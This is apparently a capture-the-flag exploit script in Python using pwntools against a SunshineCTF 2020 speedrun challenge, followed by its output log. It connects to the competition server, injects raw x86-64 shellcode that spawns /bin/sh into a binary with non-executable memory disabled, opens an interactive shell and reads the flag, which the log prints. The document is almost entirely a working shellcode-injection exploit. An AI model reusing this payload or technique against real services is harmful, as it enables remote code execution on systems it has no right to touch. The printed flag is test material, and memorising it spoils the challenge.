from pwn import *

p = remote('chal.2020.sunshinectf.org', 30007)
#p = process('./chall_07')

e = ELF('./chall_07')

p.send(b'yolo\n')

input('...')

line = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
line += b'\xcc'*(0x38-len(line))
line += b'\n'

p.send(line)

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30007: Done
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_07'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
...
[*] Switching to interactive mode
In the land of raw humanity$ ls
chall_07
flag.txt
$ cat flag.txt
sun{sidewinder-a80d0be1840663c4}
'''
